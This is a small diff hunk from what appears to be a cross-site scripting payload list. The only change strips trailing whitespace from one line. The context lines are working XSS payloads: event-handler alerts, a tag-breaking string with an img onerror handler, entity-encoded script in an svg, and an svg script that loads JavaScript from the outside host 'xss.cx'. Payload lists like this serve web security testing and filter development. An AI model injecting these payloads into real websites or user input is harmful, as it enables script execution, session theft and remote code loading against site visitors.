@@ -1216,4 +1216,4 @@ alert(1 ===  1)
 <embed src=/ onload=alert(5)>
 '">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
 <svg><script>alert&#40 1&#41<b>
-<svg><script/href="xss.cx/xss.js"//> 
+<svg><script/href="xss.cx/xss.js"//>
